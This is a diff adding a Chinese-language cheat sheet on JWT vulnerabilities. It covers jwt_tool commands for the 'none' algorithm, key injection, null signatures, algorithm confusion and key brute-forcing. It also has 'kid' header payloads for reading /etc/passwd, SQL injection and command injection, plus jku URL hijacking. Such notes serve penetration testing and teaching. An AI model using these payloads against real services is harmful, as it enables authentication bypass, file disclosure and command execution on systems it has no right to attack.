@@ -164,3 +164,121 @@ kid也可以从数据库中提取数据，这时候就有可能造成SQL注入�
 ● 尽可能避免通过URL参数发送令牌
 ● 提供aud声明（或类似内容），以指定令牌的预期接收者，防止其应用在不同网站
 ● 让颁发服务器能够撤销令牌
+
+# JWT_TOOL 使用与漏洞
+## 签名算法可被修改为none(CVE-2015-9235)
+JWT支持将算法设定为“None”。如果“alg”字段设为“ None”，那么签名会被置空，这样任何token都是有效的。
+
+```shell
+python jwt_tool.py    eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJodHRwczpcL1wvZGVtby5zam9lcmRsYW5na2VtcGVyLm5sXC8iLCJpYXQiOjE2NjI3Mzc5NjUsImV4cCI6MTY2MjczOTE2NSwiZGF0YSI6eyJoZWxsbyI6IndvcmxkIn19.LlHtXxVQkjLvW8cN_8Kb3TerEEPm2-rAfnwZ_h0pZBg  -X a
+```
+
+## 未校验签名
+
+某些服务端并未校验JWT签名，可以尝试修改payload后然后直接请求token或者直接删除signature再次请求查看其是否还有效。
+
+## JWKS公钥注入——伪造密钥(CVE-2018-0114)
+
+创建一个新的 RSA 证书对，注入一个 JWKS 文件，攻击者可以使用新的私钥对令牌进行签名，将公钥包含在令牌中，然后让服务使用该密钥来验证令牌
+
+攻击者可以通过以下方法来伪造JWT：删除原始签名，向标头添加新的公钥，然后使用与该公钥关联的私钥进行签名。
+```
+python jwt_tool.py eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJsb2dpbiI6InRpY2FycGkifQ.aqNCvShlNT9jBFTPBpHDbt2gBB1MyHiisSDdp8SQvgw -X i
+```
+
+## 空签名(CVE-2020-28042)
+从令牌末尾删除签名，手动删除就好。
+```
+python jwt_tool.py eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJsb2dpbiI6InRpY2FycGkifQ.aqNCvShlNT9jBFTPBpHDbt2gBB1MyHiisSDdp8SQvgw -X n
+```
+
+## 敏感信息泄露
+JWT的header头base64解码可泄露敏感数据如密钥文件或者密码或者注入漏洞
+
+```
+eyJraWQiOiJrZXlzLzNjM2MyZWExYzNmMTEzZjY0OWRjOTM4OWRkNzFiODUxIiwidHlwIjoiSldUIiwiYWxnIjoiUlMyNTYifQ
+```
+
+## KID参数漏洞
+### 任意文件读取
+密钥 ID (kid) 是一个可选header，是字符串类型，用于表示文件系统或数据库中存在的特定密钥，然后使用其内容来验证签名。如果有多个用于签署令牌的密钥，则此参数很有帮助，但如果它是可注入的，则可能很危险，因为攻击者可以指向内容可预测的特定文件。
+
+kid参数用于读取密钥文件，但系统并不会知道用户想要读取的到底是不是密钥文件，所以，如果在没有对参数进行过滤的前提下，攻击者是可以读取到系统的任意文件的。
+
+```
+{
+  "typ": "JWT",
+  "kid": "/etc/passwd",
+  "alg": "HS256"
+}
+```
+
+### SQL注入
+kid也可以从数据库中提取数据，这时候就有可能造成SQL注入攻击，通过构造SQL语句来获取数据或者是绕过signature的验证
+
+```
+{
+  "typ": "JWT",
+  "kid": "key11111111' || union select 'secretkey' --",
+  "alg": "HS256"
+}
+```
+
+### 命令注入
+对kid参数过滤不严也可能会出现命令注入问题，但是利用条件比较苛刻。如果服务器后端使用的是Ruby，在读取密钥文件时使用了open函数，通过构造参数就可能造成命令注入。
+```
+{
+  "typ": "JWT",
+  "kid": "keys/3c3c2ea1c3f113f649dc9389dd71b851k|whoami",
+  "alg": "HS256"
+}
+```
+
+### 改变加密算法（CVE-2016-5431/CVE-2016-10555）
+将加密算法 RS256（非对称）更改为 HS256（对称）
+
+JWT最常用的两种算法是HMAC(非对称加密算法）和RSA（非对称加密算法）。HMAC（对称加密算法）用同一个密钥对token进行签名和认证。而RSA（非对称加密算法）需要两个密钥，先用私钥加密生成JWT，然后使用其对应的公钥来解密验证
+
+将算法RS256修改为HS256（非对称密码算法=>对称密码算法）
+### 在原payload不被修改的基础上，并将算法RS256修改为HS256
+
+```
+python3 jwt_tool.py    eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJodHRwczpcL1wvZGVtby5zam9lcmRsYW5na2VtcGVyLm5sXC8iLCJpYXQiOjE2NjI3NDE3MDcsImV4cCI6MTY2Mjc0MjkwNywiZGF0YSI6eyJoZWxsbyI6IndvcmxkIn19.BOiukQghoC-t2nmM5w9SUZURv9sw0FNtmfbzirKi6EEvcqhcjTaeQF6-crCAjLxNoR84A_P8MY5mGL5ZrgDGTbfsXLbMawewaavG090FkvhCkWuPla95LJZsM0H2fFa9PpHruYmWUo9uBVRILpBXLtQDnznTPdbjwXleX3Yr0M4qEKDTPxQzO62O3vSizBm8hzgEnNkiLWPOqfTLXMBf4W0q_4V0A7tK0PoEuoVnsiB1AmHeml4ez2Ksr4m9AqAW52PgrCa9uBEICU3TlNRcXvmiTbmU_xU4W5Bu010SfpxHo3Bc8yEZvLOKC5xZ2zqUX3HJhA_4Bzxu0nmev13Yag -X k -pk public.pem
+```
+
+### SSL 密钥重用
+在某些情况下，令牌可能会使用网络服务器 SSL 连接的私钥进行签名。获取 x509 并从 SSL 中提取公钥
+
+```
+$ openssl s_client -connect example.com:443 2>&1 < /dev/null | sed -n '/-----BEGIN/,/-----END/p' > certificatechain.pem
+$ openssl x509 -pubkey -in certificatechain.pem -noout > pubkey.pem
+```
+### API 泄露公钥
+为了验证令牌，服务可以通过 API 端点（例如/API/v1/keys）泄露公钥
+
+
+### JWKS 常用位置
+- /.well-known/jwks.json
+- /openid/connect/jwks.json
+- /jwks.json
+- /api/键
+- /api/v1/keys
+
+## 签名密钥可被爆破
+HMAC签名密钥（例如HS256 / HS384 / HS512）使用对称加密,如果HS256密钥的强度较弱的话，攻击者可以直接通过蛮力攻击方式来破解密钥
+```
+python jwt_tool.py        eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJodHRwczpcL1wvZGVtby5zam9lcmRsYW5na2VtcGVyLm5sXC8iLCJpYXQiOjE2NjI3NDM4NzIsImV4cCI6MTY2Mjc0NTA3MiwiZGF0YSI6eyJoZWxsbyI6IndvcmxkIn19.WoHYNyyYLPZ45aM-BN_jqGQekzkvMi251QZbw9xDHAE  -C -d  /usr/share/wordlists/fasttrack.txt 
+```
+
+或者使用c-jwt-crack 破解
+
+## JWKS 劫持
+此攻击使用“jku”和“x5u”标头值，它们指向用于验证非对称签名令牌的 JWKS 文件或 x509 证书（通常本身位于 JWKS 文件中）的 URL。通过将“jku”或“x5u”URL 替换为包含公钥的攻击者控制的 URL，攻击者可以使用配对的私钥对令牌进行签名，并让服务检索恶意公钥并验证令牌。
+
+使用自动生成的 RSA 密钥并在提供的 URL (-ju) 处提供 JWKS 或将 URL 添加到 jwtconf.ini 配置文件中 ，并使用私钥对令牌进行签名：
+
+```
+python jwt_tool.py jwt_token -X s -ju https://ticarpi.com/jwks.json
+```
+
+## 重放JWT（token令牌不过期）
